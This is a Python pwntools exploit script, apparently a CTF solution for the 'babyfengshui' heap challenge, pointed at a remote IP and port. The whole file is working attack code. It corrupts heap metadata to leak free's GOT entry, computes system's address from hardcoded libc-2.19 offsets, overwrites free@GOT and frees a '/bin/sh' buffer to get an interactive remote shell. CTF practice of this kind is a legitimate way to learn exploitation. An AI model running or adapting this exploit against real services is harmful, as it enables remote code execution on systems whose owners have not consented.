from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])


#t = process('./babyfengshui')
t = remote('111.198.29.45', 31862)

def add_user(size, name, txlen, text):
	t.sendlineafter('Action: ', str(0))
	t.sendlineafter('size of description: ', str(size))
	t.sendlineafter('name: ', str(name))
	t.sendlineafter('text length: ', str(txlen))
	t.sendlineafter('text: ', str(text))


def delete_user(index):
	t.sendlineafter('Action: ', str(1))
	t.sendlineafter('index: ', str(index))



def display_user(index):
	t.sendlineafter('Action: ', str(2))
	t.sendlineafter('index: ', str(index))
	#return t.recv(24)[20:]



def update_user(index, txlen, text):
	t.sendlineafter('Action: ', str(3))
	t.sendlineafter('index: ', str(index))
	t.sendlineafter('text length: ', str(txlen))
	t.sendlineafter('text: ', str(text))



 

elf = ELF('./babyfengshui')
libc = ELF('./libc-2.19.so')
got_free = elf.got['free']

add_user(20,123,10,123)
add_user(30,123,10,123)
delete_user(0)
add_user(70,123,180,'/bin/sh\x00' + cyclic(168) + p32(got_free))
display_user(1)
t.recvuntil('description: ')
#t.recv(13)
addr_free = u32(t.recv(4))
log.info(hex(addr_free))
addr_sys = addr_free - 0x070750 + 0x03a940
update_user(1,5,p32(addr_sys))
delete_user(2)


t.interactive()




